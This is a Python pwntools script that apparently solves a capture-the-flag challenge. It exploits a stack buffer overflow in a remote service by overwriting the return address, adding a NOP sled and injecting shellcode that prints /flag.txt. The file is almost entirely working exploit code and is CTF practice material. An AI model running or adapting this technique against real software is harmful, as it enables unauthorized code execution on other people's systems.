import pwn

pwn.context.arch = 'amd64'

sh = pwn.remote('chal.cybersecurityrumble.de', 1990)


def inject_shellcode():
    # Target: 120 bytes
    # 8 bytes: (fake input)
    # 1 byte: (null to fool strlen)
    # 111 bytes: (padding)
    # ---
    # 8 bytes: address somewhere in no-ops to reach shellcode
    # ---
    # ? bytes: (no ops) <- Goal is to jump somewhere here
    # ? bytes: (shellcode)

    ret_addr_padding = 120

    payload = b'12345678' + b'\0';

    padding = ret_addr_padding - len(payload)
    payload += pwn.cyclic(padding)

    # Keep guessing values until this works.
    # You can use `➜ sudo dmesg | tail -10` to see info on where the program
    # failed.
    sh_code_addr = 0x7fffffffef90 # lucky guess

    print('sh_code_addr: ', hex(sh_code_addr))
    payload += pwn.p64(sh_code_addr)

    payload += pwn.asm(pwn.shellcraft.nop()) * 2048

    # Since we are using `gets`, `stdin` mustbe re-opened if we want to use it
    # Instead let's just `cat` the file
    sh_code = pwn.shellcraft.amd64.linux.cat('/flag.txt')
    sh_code += pwn.shellcraft.exit(0)

    sh_code = pwn.asm(sh_code)
    sh_code = pwn.encoder.line(sh_code)

    payload += sh_code
    print('Payload len: ', len(payload))

    return payload


payload = inject_shellcode()

with open('payload', 'wb') as f:
    f.write(payload)

sh.send(payload)
sh.interactive() # Hit enter to show the output of `cat /flag.txt`
